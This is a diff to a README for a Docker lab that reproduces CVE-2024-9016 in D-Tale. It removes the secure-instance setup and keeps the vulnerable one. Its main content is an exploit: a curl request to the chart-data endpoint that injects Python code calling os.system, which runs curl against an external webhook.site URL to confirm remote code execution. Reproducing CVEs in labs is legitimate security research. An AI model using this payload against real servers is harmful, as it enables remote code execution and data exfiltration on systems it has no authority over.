@@ -1,16 +1,8 @@
-# setup Secure instance of D-Tale to CVE-2024-9016
-```bash
-cd Secure/
-docker build -t dtale-cve-2024-9016-secure .
-docker run --rm --name dtalesecure -p 40000:40000 dtale-cve-2024-9016-secure
-```
-
-
-# setup Vulenrable instance of D-Tale to CVE-2024-9016
+# setup a D-Tale inance without need of authentication 
 ```bash
 cd Vulnerable/
-docker build -t dtale-cve-2024-9016 .
-docker run --rm --name dtale-vulnerable -p 40000:40000 dtale-cve-2024-9016
+docker build -t dtale-expose-ui .
+docker run --rm --name dtale-vulnerable -p 40000:40000 dtale-expose-ui
 ```
 now use the following command to exploit the vulnerability
 ```bash
@@ -24,6 +16,6 @@ curl 'http://127.0.0.1:40000/dtale/upload' \
   
   
 # replace https://webhook with your webhook URL
-curl -v 'http://127.0.0.1:40000/dtale/chart-data/1?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20https://webhook%20%23%22%22%22%29'
+curl -v 'http://127.0.0.1:40000/dtale/chart-data/1?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20https://webhook.site/fdda6d40-04ad-44d9-922c-d5c6e2359330%20%23%22%22%22%29'
 # response: 200 OK, body: {"error":"'Series' object has no attribute 'columns....
 ```
